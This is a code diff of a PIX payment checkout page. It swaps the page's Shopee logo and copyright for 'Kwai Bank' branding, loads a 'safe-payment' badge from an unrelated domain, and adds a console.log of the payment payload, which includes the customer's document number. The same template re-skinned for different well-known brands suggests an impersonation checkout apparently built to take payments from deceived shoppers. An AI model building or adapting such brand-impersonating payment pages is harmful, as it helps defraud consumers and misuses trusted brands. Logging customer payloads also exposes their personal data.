@@ -37,7 +37,7 @@
                 // Prepare API payload
                 const payload = {
                     external_id: 'ORDER_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
-                    total_amount: totalAmount,
+                    total_amount: Number(totalAmount),
                     payment_method: 'PIX',
                     webhook_url: window.location.origin + '/webhook/payment',
                     items: [
@@ -59,6 +59,8 @@
                         document: cleanDocument,
                     }
                 };
+
+                console.log(payload);
                 
                 // Make API call
                 $.ajax({
@@ -228,9 +230,9 @@
     <div class="content">
 
         
-        <div id="logo-header" class="container pt-4 topbar-mobile">
-    <section class="d-flex justify-content-between align-items-center mb-4">
-                    <img class="checkout-logo " alt="Shopee Logo" src="https://cloudfox-digital-products.s3.amazonaws.com/uploads/user/12wq7Gry1bZBANP/public/stores/z0qn35V7NyZ98mA/logo/kCOWzp5cU1aop988CHkDD3aARn08ajlB8nN4TIl4.png">
+        <div id="logo-header" class="container topbar-mobile">
+    <section class="d-flex justify-content-between align-items-center">
+                    <img class="checkout-logo" style="width: 125px; height: 100px;" alt="kwai Logo" src="./images/kwai-logo-1.png">
                 <div class="d-md-none">
             <img src="https://pay.zona-segurocn.site/assets/img/safe-payment.svg?v=1759268503" alt="">
         </div>
@@ -1129,7 +1131,7 @@
     <div class="d-flex" style="gap: 0.5rem;">
                             <img src="./images/card-pix.svg" width="44">
                     </div>
-    <p class="mt-4">© 2025 Shopee</p>
+    <p class="mt-4">© 2025 Kwai Bank</p>
 
     <div class="security mt-4 d-none sm-flex">
         <button class="btn btn-security">
